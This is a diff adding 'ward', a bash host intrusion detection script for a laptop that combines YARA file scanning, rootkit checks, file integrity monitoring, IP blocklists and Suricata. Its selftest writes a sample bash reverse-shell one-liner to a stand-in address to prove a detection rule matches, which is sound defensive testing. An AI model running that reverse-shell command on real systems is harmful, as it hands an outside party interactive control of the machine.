@@ -1,0 +1,444 @@
+#!/bin/bash
+# ward - small host intrusion detection for one laptop.
+#
+#   YARA on new files (inotify, no polling)      -> like ClamAV on-access
+#   file integrity + package verification        -> like Wazuh syscheck
+#   rootkit / persistence checks                 -> like Wazuh rootcheck
+#   known-bad IP sets in nftables                -> like the CrowdSec blocklist
+#   Suricata, only while on mains power          -> network IDS
+#
+# Battery rules: nothing polls. The watcher sleeps in the kernel until a file
+# event arrives; the hourly tick reads a few /proc files; anything that walks
+# the disk or the network waits for mains power.
+
+set -u
+umask 077
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+CONF=${WARD_CONF:-/etc/ward/ward.conf}
+LIB=${WARD_LIB:-/var/lib/ward}
+LOG=${WARD_LOG:-/var/log/ward}
+RULES_SRC=${WARD_RULES:-/etc/ward/rules}
+RULES=$LIB/rules.yarc
+QDIR=$LIB/quarantine
+BASE=$LIB/base
+
+# defaults, overridden by ward.conf
+USER_NAME=user
+WATCH_DIRS="/tmp /var/tmp /dev/shm"
+SWEEP_DIRS="/usr/local /opt /etc /tmp /var/tmp /dev/shm /root"
+DROP_ZONES="/tmp /var/tmp /dev/shm"
+EXCLUDE_RE='^/tmp/claude-[0-9]+/'
+FIM_PATHS="/etc /boot /usr/local /root/.ssh"
+QUARANTINE=1
+MAX_SIZE=67108864
+IDS=0
+BLOCKLISTS=1
+[ -r "$CONF" ] && . "$CONF"
+
+mkdir -p "$LIB" "$LOG" "$QDIR" "$BASE"
+
+now() { date +%s; }
+on_ac() { local f; for f in /sys/class/power_supply/*/; do
+    [ "$(cat "$f/type" 2>/dev/null)" = Mains ] && [ "$(cat "$f/online" 2>/dev/null)" = 1 ] && return 0
+done; return 1; }
+# run something heavy without taking the CPU or the disk from the user
+idle() { nice -n 19 ionice -c 3 "$@"; }
+due() { # due NAME SECONDS -> true if NAME last ran more than SECONDS ago
+    local s=$LIB/last.$1 t=0
+    [ -f "$s" ] && t=$(cat "$s")
+    [ $(( $(now) - t )) -ge "$2" ]
+}
+done_at() { now > "$LIB/last.$1"; }
+
+# ---------------------------------------------------------------- alerts
+desktop_env() { # print the env of the user's running desktop, so root can notify
+    local p
+    for p in $(pgrep -u "$USER_NAME" -x dunst) $(pgrep -u "$USER_NAME" -x dwm); do
+        tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -E '^(DISPLAY|DBUS_SESSION_BUS_ADDRESS|XAUTHORITY)=' && return 0
+    done
+    return 1
+}
+
+alert() { # alert SEVERITY MESSAGE
+    local sev=$1; shift
+    local msg=$*
+    local key; key=$(printf '%s' "$msg" | sha1sum | cut -c1-16)
+    local seen=$LIB/seen
+    # one notification per message per day; the log keeps everything
+    printf '%s %-6s %s\n' "$(date '+%F %T')" "$sev" "$msg" >> "$LOG/alerts.log"
+    if grep -q "^$key " "$seen" 2>/dev/null; then
+        local t; t=$(awk -v k="$key" '$1==k{print $2}' "$seen")
+        [ $(( $(now) - t )) -lt 86400 ] && return 0
+        sed -i "/^$key /d" "$seen"
+    fi
+    echo "$key $(now)" >> "$seen"
+    local urg=normal; [ "$sev" = high ] && urg=critical; [ "$sev" = low ] && urg=low
+    local envs; envs=$(desktop_env) || return 0
+    # shellcheck disable=SC2086
+    env -i $envs chpst -u "$USER_NAME" notify-send -u "$urg" -a ward "ward: $sev" "$msg" 2>/dev/null &
+}
+
+# ---------------------------------------------------------------- yara
+compile_rules() {
+    local tmp=$LIB/rules.yarc.new
+    yarac -w "$RULES_SRC"/*.yar "$tmp" && mv "$tmp" "$RULES"
+}
+
+in_zone() { local z; for z in $DROP_ZONES; do case $1 in "$z"/*) return 0;; esac; done; return 1; }
+
+quarantine() { # quarantine FILE RULE
+    local f=$1 id; id=$(date +%Y%m%d-%H%M%S)-$$-$RANDOM
+    mv -f -- "$f" "$QDIR/$id" 2>/dev/null || return 1
+    chmod 000 "$QDIR/$id"
+    printf '%s\t%s\t%s\n' "$id" "$2" "$f" >> "$QDIR/index"
+    echo "$id"
+}
+
+worth_scanning() { # cheap filter before starting yara
+    local f=$1
+    [ -f "$f" ] && [ ! -L "$f" ] || return 1
+    [[ $f =~ $EXCLUDE_RE ]] && return 1
+    local sz; sz=$(stat -c %s -- "$f" 2>/dev/null) || return 1
+    [ "$sz" -gt 0 ] && [ "$sz" -le "$MAX_SIZE" ] || return 1
+    return 0
+}
+
+scan_file() { # scan_file FILE -> alerts, maybe quarantines
+    local f=$1 out line rule sev desc
+    worth_scanning "$f" || return 0
+    out=$(timeout 30 yara -C -w -m "$RULES" "$f" 2>/dev/null) || return 0
+    [ -n "$out" ] || return 0
+    while IFS= read -r line; do
+        rule=${line%% *}
+        sev=$(sed -n 's/.*severity="\([a-z]*\)".*/\1/p' <<<"$line")
+        desc=$(sed -n 's/.*description="\([^"]*\)".*/\1/p' <<<"$line")
+        [ -n "$sev" ] || sev=medium
+        if [ "$sev" = high ] && [ "$QUARANTINE" = 1 ] && in_zone "$f" && [ -e "$f" ]; then
+            local id; id=$(quarantine "$f" "$rule") &&
+                { alert high "$rule: $f quarantined as $id ($desc). Undo: ward restore $id"; continue; }
+        fi
+        alert "$sev" "$rule: $f ($desc)"
+    done <<<"$out"
+}
+
+scan_tree() { # full YARA pass over directories; caller decides about power
+    local d
+    for d in "$@"; do
+        [ -d "$d" ] || [ -f "$d" ] || continue
+        idle timeout 3600 yara -C -w -m -N -r -p 2 "$RULES" "$d" 2>/dev/null |
+        while IFS= read -r line; do
+            local f=${line##*\] }
+            [[ $f =~ $EXCLUDE_RE ]] && continue
+            scan_file "$f"   # re-scan alone: same logic for severity and quarantine
+        done
+    done
+}
+
+# ---------------------------------------------------------------- watcher
+cmd_watch() {
+    [ -f "$RULES" ] || compile_rules || exit 1
+    local dirs=() d
+    for d in $WATCH_DIRS; do [ -d "$d" ] && dirs+=("$d"); done
+    # critical single files and service dirs: alert at once, no YARA needed
+    local crit=(/etc /etc/sv /var/service /root/.ssh "/home/$USER_NAME/.ssh")
+    local live=(); for d in "${crit[@]}"; do [ -d "$d" ] && live+=("$d"); done
+
+    trap 'kill 0' EXIT TERM INT
+    inotifywait -q -m -e create,moved_to,attrib,close_write --format '%e %w%f' "${live[@]}" |
+    while read -r ev f; do
+        case $f in
+            /etc/ld.so.preload) alert high "/etc/ld.so.preload changed ($ev): userland rootkits load from here" ;;
+            /etc/passwd|/etc/shadow|/etc/group|/etc/doas.conf|/etc/sudoers) alert medium "$f changed ($ev)" ;;
+            /etc/sv/*|/var/service/*)
+                [[ $ev == *CREATE* || $ev == *MOVED_TO* ]] && alert medium "new runit service: $f" ;;
+            */.ssh/authorized_keys*) alert high "$f changed ($ev): a new key lets someone log in" ;;
+        esac
+    done &
+
+    [ ${#dirs[@]} -gt 0 ] || { wait; return; }
+    inotifywait -q -m -r -e close_write,moved_to --format '%w%f' \
+        --exclude "$EXCLUDE_RE" "${dirs[@]}" |
+    while IFS= read -r f; do
+        scan_file "$f"
+    done &
+    wait
+}
+
+# ---------------------------------------------------------------- rootcheck
+cmd_check() {
+    local p exe m
+
+    [ -e /etc/ld.so.preload ] && alert high "/etc/ld.so.preload exists: $(head -c 200 /etc/ld.so.preload | tr '\n' ' ')"
+
+    for p in /proc/[0-9]*; do
+        exe=$(readlink "$p/exe" 2>/dev/null) || continue
+        case $exe in
+            /tmp/claude-*) ;;
+            /tmp/.mount_*) alert low "pid ${p#/proc/} ($(cat $p/comm)) is an AppImage: $exe" ;;
+            /memfd:*) alert medium "pid ${p#/proc/} ($(cat $p/comm)) runs from memory: $exe" ;;
+            /tmp/*|/var/tmp/*|/dev/shm/*) alert high "pid ${p#/proc/} ($(cat $p/comm)) runs from a temp dir: $exe" ;;
+            *" (deleted)")
+                case $exe in /usr/*|/opt/*|/home/*) ;;   # usually an updated binary still running
+                    *) alert high "pid ${p#/proc/} ($(cat $p/comm)) runs a deleted file: $exe" ;; esac ;;
+        esac
+        # LD_PRELOAD in any root process
+        if [ "$(stat -c %u "$p" 2>/dev/null)" = 0 ] && grep -qa '^LD_PRELOAD=' <(tr '\0' '\n' < "$p/environ" 2>/dev/null); then
+            alert high "root pid ${p#/proc/} ($(cat $p/comm)) has LD_PRELOAD set"
+        fi
+    done
+
+    # modules that do not come from the installed kernel tree
+    while read -r m _; do
+        modinfo -n "$m" >/dev/null 2>&1 || alert high "kernel module '$m' is loaded but not installed on disk"
+    done < /proc/modules
+    # loadable modules visible in sysfs but missing from /proc/modules (hidden)
+    for m in /sys/module/*/initstate; do
+        m=${m%/initstate}; m=${m##*/}
+        grep -q "^$m " /proc/modules || alert high "kernel module '$m' is hidden from /proc/modules"
+    done
+    local taint; taint=$(cat /proc/sys/kernel/tainted)
+    if [ -f "$BASE/taint" ] && [ "$taint" != "$(cat "$BASE/taint")" ]; then
+        alert medium "kernel taint changed $(cat "$BASE/taint") -> $taint (a new out-of-tree or forced module?)"
+    fi
+    echo "$taint" > "$BASE/taint"
+
+    awk -F: '$3==0 && $1!="root"{print $1}' /etc/passwd | while read -r u; do alert high "second uid-0 account: $u"; done
+    awk -F: '$2==""{print $1}' /etc/shadow | while read -r u; do alert high "account without password: $u"; done
+
+    local i; for i in /sys/class/net/*; do
+        [ $(( $(cat "$i/flags") & 0x100 )) -ne 0 ] || continue
+        sv status ward-ids 2>/dev/null | grep -q '^run' && continue
+        alert medium "interface ${i##*/} is in promiscuous mode (sniffer?)"
+    done
+
+    # listening sockets: alert on new ones only
+    local cur=$LIB/listen.now
+    ss -Hlntu 2>/dev/null | awk '{print $1, $5}' | sed -E 's/%[a-z0-9]+:/:/' | sort -u > "$cur"
+    if [ -f "$BASE/listen" ]; then
+        comm -13 "$BASE/listen" "$cur" | while read -r l; do
+            alert medium "new listening socket: $l ($(ss -Hlntup | grep -F "${l#* }" | grep -o 'users:.*' | head -1))"
+        done
+    fi
+    mv "$cur" "$BASE/listen"
+
+    # blocklist hits: something on this machine talked to a botnet/hijacked net
+    local hits; hits=$(nft list counter inet ward out_hits 2>/dev/null | awk '/packets/{print $2}')
+    if [ -n "$hits" ]; then
+        local old=0; [ -f "$LIB/out_hits" ] && old=$(cat "$LIB/out_hits")
+        [ "$hits" -gt "$old" ] && alert high "blocked $((hits-old)) outbound packets to known-bad IPs: $(dmesg 2>/dev/null | grep -o 'ward-out.*DST=[^ ]*' | tail -3 | grep -o 'DST=[^ ]*' | tr '\n' ' ')"
+        echo "$hits" > "$LIB/out_hits"
+    fi
+}
+
+# ---------------------------------------------------------------- file integrity
+manifest() { # manifest PATH... -> "path<TAB>sha256 mode uid:gid", sorted by path
+    local p
+    for p in "$@"; do
+        [ -e "$p" ] || continue
+        idle find "$p" -xdev \( -type f -o -type l \) -printf '%y\t%m\t%U:%G\t%p\t%l\n' 2>/dev/null
+    done | while IFS=$'\t' read -r y m o f l; do
+        if [ "$y" = l ]; then h="link:$l"; else h=$(idle sha256sum -- "$f" 2>/dev/null | cut -c1-64); fi
+        printf '%s\t%s %s %s\n' "$f" "$h" "$m" "$o"
+    done | LC_ALL=C sort -t $'\t' -k1,1 -u
+}
+
+suid_list() {
+    idle find / \( -path /proc -o -path /sys -o -path /dev -o -path /run -o -path "$QDIR" \) -prune -o \
+        -type f -perm /6000 -printf '%m %U %p\n' 2>/dev/null | sort -k3
+}
+
+pkg_ok() { # pkg_ok FILE -> true if a package owns FILE and xbps has no complaint about it
+    local pkg; pkg=$(xbps-query -o "$1" 2>/dev/null | head -1 | cut -d: -f1) || return 1
+    [ -n "$pkg" ] || return 1
+    ! xbps-pkgdb "${pkg%-*}" 2>&1 | grep -qF "$1"
+}
+
+cmd_fim() {
+    local new=$LIB/fim.new
+    # shellcheck disable=SC2086
+    manifest $FIM_PATHS /etc/sv /var/service "/home/$USER_NAME/.ssh" "/home/$USER_NAME/.xinitrc" \
+        "/home/$USER_NAME/.zshrc" "/home/$USER_NAME/.zprofile" "/home/$USER_NAME/.profile" \
+        "/home/$USER_NAME/.bashrc" "/home/$USER_NAME/.config/autostart" "/home/$USER_NAME/.local/bin" > "$new"
+    if [ -f "$BASE/fim" ]; then
+        LC_ALL=C join -t $'\t' -a1 -a2 -e MISSING -o 0,1.2,2.2 "$BASE/fim" "$new" |
+        while IFS=$'\t' read -r path old cur; do
+            [ "$old" = "$cur" ] && continue
+            if [ "$old" = MISSING ]; then what=added; elif [ "$cur" = MISSING ]; then what=removed; else what=changed; fi
+            # package upgrades rewrite /etc and /boot; files xbps can vouch for are not news
+            [ "$what" != removed ] && pkg_ok "$path" && continue
+            case $path in
+                */authorized_keys*|/etc/ld.so.preload|/etc/passwd|/etc/shadow|/etc/doas.conf|/etc/sv/*/run|/var/service/*|/etc/rc.local|/etc/profile.d/*) sev=high ;;
+                *) sev=low ;;
+            esac
+            alert "$sev" "file $what: $path"
+        done
+    fi
+    mv "$new" "$BASE/fim"
+
+    local s=$LIB/suid.new; suid_list > "$s"
+    [ -f "$BASE/suid" ] && comm -13 "$BASE/suid" "$s" | while read -r l; do alert high "new setuid/setgid file: $l"; done
+    mv "$s" "$BASE/suid"
+}
+
+cmd_pkgs() { # verify every installed package file against its recorded hash
+    idle xbps-pkgdb -a 2>&1 | grep -iE 'mismatch|not found|missing' | grep -v -E '\.(pyc|cache)' | head -50 |
+    while IFS= read -r l; do alert medium "package check: $l"; done
+}
+
+# ---------------------------------------------------------------- blocklists
+cmd_net() { # ward net [load] -> fetch lists (unless load) and swap the nft sets atomically
+    local f=$LIB/blocklist.nft tmp=$LIB/bl.tmp
+    if [ "${1:-}" != load ]; then
+        mkdir -p "$tmp"; rm -f "$tmp"/*
+        curl -fsS --max-time 60 -o "$tmp/drop4" https://www.spamhaus.org/drop/drop_v4.json &&
+        curl -fsS --max-time 60 -o "$tmp/drop6" https://www.spamhaus.org/drop/drop_v6.json &&
+        curl -fsS --max-time 60 -o "$tmp/feodo" https://feodotracker.abuse.ch/downloads/ipblocklist_recommended.txt ||
+            { echo "ward: blocklist download failed, keeping the old sets"; return 1; }
+        local v4 v6
+        # accept only well-formed addresses; never block private, loopback or link-local space
+        v4=$( { grep -o '"cidr":"[0-9./]*"' "$tmp/drop4" | cut -d'"' -f4; grep -E '^[0-9.]+$' "$tmp/feodo"; } |
+              grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}(/[0-9]{1,2})?$' |
+              grep -vE '^(10|127|0)\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^169\.254\.|^100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.' |
+              sort -u | paste -sd, )
+        v6=$(grep -o '"cidr":"[0-9a-fA-F:./]*"' "$tmp/drop6" | cut -d'"' -f4 | grep -E '^[0-9a-fA-F:]+/[0-9]{1,3}$' | sort -u | paste -sd, )
+        [ "$(tr ',' '\n' <<<"$v4" | wc -l)" -gt 100 ] || { echo "ward: list looks truncated, keeping the old sets"; return 1; }
+        cat > "$f.new" <<EOF
+destroy table inet ward
+table inet ward {
+    counter out_hits {}
+    counter in_hits {}
+    set bad4 { type ipv4_addr; flags interval; auto-merge; elements = { $v4 } }
+    set bad6 { type ipv6_addr; flags interval; auto-merge; ${v6:+elements = { $v6 \}} }
+    chain out {
+        type filter hook output priority -5; policy accept;
+        ip daddr @bad4 limit rate 6/minute log prefix "ward-out " level warn
+        ip6 daddr @bad6 limit rate 6/minute log prefix "ward-out " level warn
+        ip daddr @bad4 counter name out_hits reject with icmpx admin-prohibited
+        ip6 daddr @bad6 counter name out_hits reject with icmpx admin-prohibited
+    }
+    chain in {
+        type filter hook input priority -5; policy accept;
+        ip saddr @bad4 counter name in_hits drop
+        ip6 saddr @bad6 counter name in_hits drop
+    }
+}
+EOF
+        sed -i 's/elements = {  }//' "$f.new"
+        nft -c -f "$f.new" || { echo "ward: generated ruleset does not parse"; return 1; }
+        mv "$f.new" "$f"
+        rm -rf "$tmp"
+        echo 0 > "$LIB/out_hits"
+    fi
+    [ -f "$f" ] && nft -f "$f"
+}
+
+# ---------------------------------------------------------------- suricata (mains only)
+ET_URL=https://rules.emergingthreats.net/open/suricata-8.0/emerging.rules.tar.gz
+cmd_ids_rules() {
+    local d=$LIB/et.tmp out=/var/lib/suricata/rules/suricata.rules
+    rm -rf "$d"; mkdir -p "$d/x" /var/lib/suricata/rules
+    curl -fsS --max-time 300 -o "$d/r.tgz" "$ET_URL" &&
+    curl -fsS --max-time 60 -o "$d/r.md5" "$ET_URL.md5" || { echo "ward: ET download failed"; return 1; }
+    [ "$(md5sum < "$d/r.tgz" | cut -c1-32)" = "$(tr -dc 0-9a-f < "$d/r.md5" | cut -c1-32)" ] || { echo "ward: ET checksum mismatch"; return 1; }
+    tar -xzf "$d/r.tgz" -C "$d/x" --no-same-owner --no-same-permissions 'rules/*.rules' 2>/dev/null
+    cat "$d"/x/rules/*.rules > "$d/all.rules"
+    # the rule set must load before it replaces the running one
+    idle suricata -T -c /etc/suricata/suricata.yaml -S "$d/all.rules" -l "$d" >/dev/null 2>&1 ||
+        { echo "ward: ET rules failed suricata -T"; return 1; }
+    mv "$d/all.rules" "$out"; rm -rf "$d"
+    sv status ward-ids 2>/dev/null | grep -q '^run' && sv restart ward-ids
+}
+
+cmd_power() { # acpid calls this on every mains change, the tick at boot
+    [ "$IDS" = 1 ] || { sv down ward-ids >/dev/null 2>&1; return 0; }
+    if on_ac; then sv up ward-ids; else sv down ward-ids; fi
+}
+
+cmd_ids_alert() { # reads suricata fast.log lines on stdin
+    local l
+    while IFS= read -r l; do
+        case $l in
+            *"[Priority: 1]"*) alert high "IDS: $(sed -E 's/^[^]]*\] *\[[^]]*\] *//; s/\[Classification.*\] *\[Priority: [0-9]\] */ /' <<<"$l")" ;;
+            *"[Priority: 2]"*) alert medium "IDS: $(sed -E 's/^[^]]*\] *\[[^]]*\] *//; s/\[Classification.*\] *\[Priority: [0-9]\] */ /' <<<"$l")" ;;
+        esac
+    done
+}
+
+# ---------------------------------------------------------------- scheduler
+cmd_tick() {
+    cmd_check
+    cmd_power
+    on_ac || return 0                     # everything below walks the disk or the network
+    if due fim 86400; then cmd_fim; done_at fim; fi
+    if due sweep 86400; then
+        # shellcheck disable=SC2086
+        scan_tree $SWEEP_DIRS; done_at sweep
+    fi
+    if due pkgs 604800; then cmd_pkgs; done_at pkgs; fi
+    if [ "$BLOCKLISTS" = 1 ] && due net 86400; then cmd_net && done_at net; fi
+    if [ "$IDS" = 1 ] && due et 604800; then cmd_ids_rules && done_at et; fi
+}
+
+cmd_status() {
+    printf 'power      %s\n' "$(on_ac && echo mains || echo battery)"
+    for s in ward ward-tick ward-ids; do printf '%-10s %s\n' "$s" "$(sv status $s 2>/dev/null | cut -d';' -f1)"; done
+    for j in fim sweep pkgs net et; do
+        [ -f "$LIB/last.$j" ] && printf 'last %-5s %s\n' "$j" "$(date -d @"$(cat "$LIB/last.$j")" '+%F %R')"
+    done
+    printf 'blocklist  %s v4 entries, %s outbound hits\n' \
+        "$(nft list set inet ward bad4 2>/dev/null | tr ',' '\n' | grep -c '[0-9]\.')" "$(cat "$LIB/out_hits" 2>/dev/null || echo 0)"
+    printf 'quarantine %s files\n' "$(find "$QDIR" -type f ! -name index | wc -l)"
+    echo; echo "last alerts:"; tail -n 10 "$LOG/alerts.log" 2>/dev/null
+}
+
+cmd_restore() {
+    local id=$1 line dst
+    line=$(grep "^$id	" "$QDIR/index") || { echo "no such id: $id"; return 1; }
+    dst=$(cut -f3 <<<"$line")
+    [ -e "$dst" ] && { echo "$dst exists, not overwriting"; return 1; }
+    chmod 600 "$QDIR/$id" && mv "$QDIR/$id" "$dst" && sed -i "/^$id	/d" "$QDIR/index" && echo "restored $dst (mode 600)"
+}
+
+cmd_selftest() { # harmless samples that must match, in a drop zone, then cleaned up
+    local d; d=$(mktemp -d /tmp/ward-selftest.XXXXXX)
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n' > "$d/rev.sh"
+    local out; out=$(yara -C -w "$RULES" "$d/rev.sh")
+    rm -rf "$d"
+    [[ $out == shell_reverse_script* ]] && echo "selftest ok: rules load and match" || { echo "selftest FAILED: '$out'"; return 1; }
+}
+
+case ${1:-} in
+    watch)     cmd_watch ;;
+    tick)      cmd_tick ;;
+    check)     cmd_check ;;
+    fim)       cmd_fim ;;
+    pkgs)      cmd_pkgs ;;
+    scan)      shift; [ -f "$RULES" ] || compile_rules; for p in "$@"; do if [ -d "$p" ]; then scan_tree "$p"; else scan_file "$p"; fi; done ;;
+    sweep)     # shellcheck disable=SC2086
+               scan_tree $SWEEP_DIRS; done_at sweep ;;
+    net)       shift; cmd_net "$@" ;;
+    ids-rules) cmd_ids_rules ;;
+    ids-alert) cmd_ids_alert ;;
+    power)     cmd_power ;;
+    rules)     compile_rules && echo "compiled $RULES" && sv restart ward >/dev/null 2>&1 ;;
+    status)    cmd_status ;;
+    q)         column -t -s $'\t' "$QDIR/index" 2>/dev/null || echo empty ;;
+    restore)   cmd_restore "${2:?id}" ;;
+    selftest)  cmd_selftest ;;
+    *) cat <<EOF
+usage: ward COMMAND
+  status            services, last runs, blocklist, recent alerts
+  scan PATH...      YARA scan now (files or directories)
+  sweep             YARA pass over SWEEP_DIRS
+  check             rootkit/persistence checks (cheap)
+  fim               file integrity + setuid diff
+  pkgs              verify all package files (xbps-pkgdb -a)
+  net [load]        refresh known-bad IP sets
+  ids-rules         refresh Suricata ET Open rules
+  q / restore ID    list / undo quarantine
+  rules             recompile /etc/ward/rules after editing
+  selftest          prove the rules match
+EOF
+    ;;
+esac
